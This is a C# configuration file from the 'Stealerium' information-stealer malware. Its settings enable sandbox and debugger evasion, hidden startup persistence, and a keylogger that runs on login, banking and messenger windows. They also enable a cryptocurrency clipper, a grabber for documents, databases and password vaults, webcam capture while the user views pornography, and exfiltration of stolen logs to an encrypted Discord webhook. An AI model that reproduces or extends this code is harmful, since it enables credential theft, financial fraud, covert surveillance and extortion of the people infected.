using System.Collections.Generic;
using Stealerium.Modules.Implant;

namespace Stealerium
{
    public static class Config
    {
        public static string Version = "1.0";

#if DEBUG
        // Debug mode (write all exceptions to file)
        public static string DebugMode = "1";

        // Application mutex (random)
        public static string Mutex = "ewf54wef564";

        // Anti VM, SandBox, Any.Run, Emulator, Debugger, Process
        public static string AntiAnalysis = "0";

        // Drop and Hide executable to startup directory
        public static string Autorun = "1";

        // Random start delay (0-10 seconds)
        public static string StartDelay = "0";

        // Create web-camera and desktop screenshot when user watching NSFW content
        public static string WebcamScreenshot = "1";

        // Run keylogger when user opened log-in form, banking service or messenger
        public static string KeyloggerModule = "1";

        // Run clipper when user opened cryptocurrency application
        public static string ClipperModule = "0";

        // File grabber:
        public static string GrabberModule = "1";

        // Discord Webhook where to send captured logs
        public static string Webhook =
            "ENCRYPTED:Z6wDfv2IxQbZmN3X8dQv3iFnArjC+Xh8XT65VFx/ST+IEkNK2bfVjSZEjgv86uAD/wFiJ8LmuzQ6Am+RfjVolqZDhoeN2SBIh5eBJGML0Stttb0eAAyFuBRpZEAZ27wnguf+Gtzue156grs+16rnt7ywK1gaGK/G4ivBsBpussc=";
#elif RELEASE
        // Debug mode (write all exceptions to file)
        public static string DebugMode = "--- Debug ---";

        // Application mutex (random)
        public static string Mutex = "--- Mutex ---";

        // Anti VM, SandBox, Any.Run, Emulator, Debugger, Process
        public static string AntiAnalysis = "--- AntiAnalysis ---";

        // Drop and Hide executable to startup directory
        public static string Autorun = "--- Startup ---";

        // Random start delay (0-10 seconds)
        public static string StartDelay = "--- StartDelay ---";

        // Create web-camera and desktop screenshot when user watching NSFW content
        public static string WebcamScreenshot = "--- WebcamScreenshot ---";

        // Run keylogger when user opened log-in form, banking service or messenger
        public static string KeyloggerModule = "--- Keylogger ---";

        // Run clipper when user opened cryptocurrency application
        public static string ClipperModule = "--- Clipper ---";

        // File grabber:
        public static string GrabberModule = "--- Grabber ---";

        // Discord Webhook where to send captured logs
        public static string Webhook = "--- Webhook ---";
#endif

        // Discord Webhook bot avatar
        public static string Avatar = StringsCrypt.Decrypt(new byte[]
        {
            227, 229, 163, 37, 29, 43, 37, 158, 104, 37, 13, 195, 211, 80, 55, 1, 163, 216, 210, 234, 239, 30, 166, 60,
            215, 48, 124, 51, 90, 119, 2, 1, 202, 159, 135, 229, 169, 49, 13, 133, 163, 98, 230, 144, 228, 54, 208, 68,
            4, 42, 27, 177, 180, 234, 89, 174, 196, 27, 63, 146, 137, 167, 104, 90, 106, 136, 189, 147, 138, 11, 116,
            24, 249, 78, 137, 135, 50, 104, 59, 199, 236, 28, 11, 19, 229, 93, 228, 74, 139, 119, 81, 64, 135, 108, 108,
            143, 177, 159, 239, 235, 222, 167, 78, 173, 235, 180, 152, 187, 16, 86, 88, 222
        });

        // Discord Webhook bot username
        public static string Username = StringsCrypt.Decrypt(new byte[]
            {208, 138, 80, 115, 89, 12, 47, 194, 189, 116, 154, 25, 46, 155, 252, 130});

        // Clipper addresses:
        public static Dictionary<string, string> ClipperAddresses =
            new Dictionary<string, string>
            {
                {"btc", "--- ClipperBTC ---"}, // Bitcoin
                {"eth", "--- ClipperETH ---"}, // Ethereum
                {"ltc", "--- ClipperLTC ---"} // Litecoin
            };

        // Start keylogger when active window title contains this text:
        public static string[] KeyloggerServices =
        {
            "facebook", "twitter",
            "chat", "telegram", "skype", "discord", "viber", "message",
            "gmail", "protonmail", "outlook",
            "password", "encryption", "account", "login", "key", "sign in",
            "bank", "credit", "card",
            "shop", "buy", "sell"
        };

        public static string[] BankingServices =
        {
            "qiwi", "money", "exchange",
            "bank", "credit", "card", "paypal"
        };

        // Start clipper when active window title contains this text:
        public static string[] CryptoServices =
        {
            "bitcoin", "monero", "dashcoin", "litecoin", "etherium", "stellarcoin",
            "btc", "eth", "xmr", "xlm", "xrp", "ltc", "bch",
            "blockchain", "paxful", "investopedia", "buybitcoinworldwide",
            "cryptocurrency", "crypto", "trade", "trading", "wallet", "coinomi", "coinbase"
        };

        // Start webcam capture when active window title contains this text:
        public static string[] PornServices =
        {
            "porn", "sex", "hentai", "chaturbate"
        };

        // Social networks
        public static string[] SocialServices =
        {
            "facebook", "vk.com", "ok.ru", "instagram", "whatsapp", "twitter", "gmail", "linkedin", "viber", "skype",
            "reddit", "flickr", "youtube", "pinterest", "tiktok"
        };


        // Maximum file size
        public static int GrabberSizeLimit = 5120; // 5MB

        // Grabber file types:
        public static Dictionary<string, string[]> GrabberFileTypes = new Dictionary<string, string[]>
        {
            ["Document"] = new[] {"pdf", "rtf", "doc", "docx", "xls", "xlsx", "ppt", "pptx", "indd", "txt", "json"},
            ["DataBase"] = new[]
                {"db", "db3", "db4", "kdb", "kdbx", "sql", "sqlite", "mdf", "mdb", "dsk", "dbf", "wallet", "ini"},
            ["SourceCode"] = new[]
            {
                "c", "cs", "cpp", "asm", "sh", "py", "pyw", "html", "css", "php", "go", "js", "rb", "pl", "swift",
                "java", "kt", "kts", "ino"
            },
            ["Image"] = new[] {"jpg", "jpeg", "png", "bmp", "psd", "svg", "ai"}
        };

        // Decrypt config values
        public static void Init()
        {
            // Decrypt discord webhook
            Webhook = StringsCrypt.DecryptConfig(Webhook);

            if (ClipperModule != "1") return;
            ClipperAddresses["btc"] = StringsCrypt.DecryptConfig(ClipperAddresses["btc"]);
            ClipperAddresses["eth"] = StringsCrypt.DecryptConfig(ClipperAddresses["eth"]);
            ClipperAddresses["ltc"] = StringsCrypt.DecryptConfig(ClipperAddresses["ltc"]);
        }
    }
}